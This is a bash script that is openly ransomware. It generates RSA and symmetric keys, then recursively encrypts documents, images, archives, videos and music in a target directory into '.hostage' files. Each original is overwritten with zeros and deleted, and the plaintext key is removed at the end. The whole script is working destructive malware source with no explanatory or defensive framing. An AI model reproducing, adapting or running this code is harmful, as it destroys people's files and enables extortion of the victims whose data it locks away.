#!/usr/bin/bash

genKey() {
	openssl genrsa -f4 -out /tmp/ransom.key 2>/dev/null
	openssl rsa -in /tmp/ransom.key -pubout -out /tmp/ransom.pub 2>/dev/null
}

genSymetricKey() {
	head -c 128 /dev/urandom | base64 > /tmp/ransomkeyfile.key
	openssl rsautl -encrypt -pubin -inkey $1 -in /tmp/ransomkeyfile.key -out /tmp/ransomkeyfile.crypted
}

ransom() {
	enc=$1.hostage

	# encrypt file
	openssl aes-256-cbc -e -in $1 -out $enc -kfile /tmp/ransomkeyfile.key 2>/dev/null
	
	# wipe and erase original file
	size=`wc -c $1 2>/dev/null | awk -F " " '{print $1}'`
	dd if=/dev/zero of=$1 bs=1 count=$size 2>/dev/null
	rm -rf $1 2>/dev/null
}

genKey
genSymetricKey "/tmp/ransom.pub"

cd $1

DOC_LIST=`find ./ -type f -name "*.pdf" -o -name "*.txt" -o -name "*.odt" -o -name "*.xls" -o -name "*.doc" -o -name "*.docx" -o -name "*.odp" 2>/dev/null`
PICTURE_LIST=`find ./ -type f -name "*.jpg" -o -name "*.jpeg" -o -name "*.JPG" -o -name "*.JPEG" -o -name "*.png" -o -name "*.gif" 2>/dev/null`
MOVIE_LIST=`find ./ -type f -name "*.mp4" -o -name "*.flv" -o -name "*.mpeg" -o -name "*.avi" 2>/dev/null`
ARCHIVE_LIST=`find ./ -type f -name "*.rar" -o -name "*.gz" -o -name "*.7z" -o -name "*.xz" -o -name "*.zip" 2>/dev/null`
#CRYPTO_LIST=`find ./ -type f -name "*.gpg" -o -name "*.asc" -o -name "*.pem" -o -name "*.crt" -o -name "*.cer" -o -name "*.der" 2>/dev/null`
MUSIC_LIST=`find ./ -type f -name "*.mp3" -o -name "*.ogg" 2>/dev/null`	

for doc in $DOC_LIST
do
	ransom $doc
done

for picture in $PICTURE_LIST
do
	ransom $picture
done

for archive in $ARCHIVE_LIST
do
	ransom $archive
done

for movie in $MOVIE_LIST
do
	ransom $movie
done

for music in $MUSIC_LIST
do
	ransom $music
done

rm /tmp/ransomkeyfile.key
